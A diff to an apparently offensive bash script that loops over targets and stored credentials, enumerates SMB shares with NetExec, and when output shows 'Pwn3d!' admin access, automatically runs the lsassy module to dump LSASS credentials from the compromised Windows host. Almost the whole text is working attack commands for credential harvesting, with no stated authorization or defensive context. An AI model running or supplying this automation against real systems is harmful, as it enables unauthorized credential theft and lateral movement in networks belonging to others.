@@ -245,11 +245,26 @@ for proto in "${PROTOCOLS[@]}"; do
         echo "[+] SMB ENUM: $IP | $USER:$PASS"
 
         if [[ "$AUTH_MODE" == "local" ]]; then
-            nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null)
         elif [[ -n "$DOMAIN" ]]; then
-            nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null)
         else
-            nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null)
+        fi
+        
+        echo "$OUT" | tee -a "$SMB_OUT"
+        
+        # cek apakah login sukses
+        if echo "$OUT" | grep -q "Pwn3d!"; then
+            echo "[+] SMB compromised, running lsassy..." | tee -a "$SMB_OUT"
+        
+            if [[ "$AUTH_MODE" == "local" ]]; then
+                nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            elif [[ -n "$DOMAIN" ]]; then
+                nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            else
+                nxc smb "$IP" -u "$USER" -p "$PASS" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+            fi
         fi
 
         done
